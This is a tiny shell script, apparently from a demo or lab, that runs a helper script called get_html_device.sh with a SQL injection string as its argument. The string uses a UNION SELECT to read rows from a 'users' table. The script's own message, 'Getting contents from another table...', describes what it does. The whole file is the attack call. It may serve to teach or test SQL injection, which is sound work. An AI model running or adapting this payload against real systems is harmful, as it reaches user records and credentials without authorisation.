echo "Getting contents from another table..."
echo

./get_html_device.sh "11' union select *  from users where user_id  ='1'; --"
